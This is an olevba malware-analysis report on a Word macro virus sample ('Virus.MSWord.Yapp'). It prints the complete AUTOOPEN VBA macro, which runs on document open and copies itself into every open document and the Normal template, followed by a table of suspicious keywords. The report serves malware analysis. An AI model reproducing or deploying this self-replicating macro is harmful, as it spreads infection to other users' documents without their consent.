olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Yapp-6935ad6cb9592cbe34084add8b0d7873cbfe3c0e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Yapp-6935ad6cb9592cbe34084add8b0d7873cbfe3c0e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AUTOOPEN.bas 
in file: Virus.MSWord.Yapp-6935ad6cb9592cbe34084add8b0d7873cbfe3c0e - OLE stream: 'Macros/VBA/AUTOOPEN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
'(C)CopyRight 1998.12 By Pu HongYi
On Error Resume Next
Dim NEWW, MYAPP As Document, MYAPP1, MYAPP2 As Document
Set MYAPP = Nothing
For Each MYAPP2 In Documents
    If MYAPP2.VBProject.VBComponents.Count = 1 Then
        Set NEWW = MYAPP2.VBProject.VBComponents.Add(1)
        NEWW.Name = "AUTOOPEN"
    End If
Next
If Normal.ThisDocument.VBProject.VBComponents.Count = 1 Then
    Set NEWW = Normal.ThisDocument.VBProject.VBComponents.Add(1)
    NEWW.Name = "AUTOOPEN"
End If
For Each MYAPP In Documents
    For Each MYAPP1 In ThisDocument.VBProject.VBE.CodePanes
        If Trim(MYAPP.VBProject.VBE.CodePanes(1).CodeModule.Lines(1, 1)) <> "Sub MAIN()" Then
            MYAPP.VBProject.VBE.CodePanes(1).CodeModule.InsertLines 1, _
                MYAPP1.CodeModule.Lines(1, 30)
        End If
        If Trim(MYAPP1.CodeModule.Lines(1, 1)) <> "Sub MAIN()" Then
        '    MYAPP1.CodeModule.InsertLines 1, _
                MYAPP.VBProject.VBE.CodePanes(1).CodeModule.Lines(1, 30)
        End If
    Next
    Set MYAPP = Nothing
Next
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBProject.VBE       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

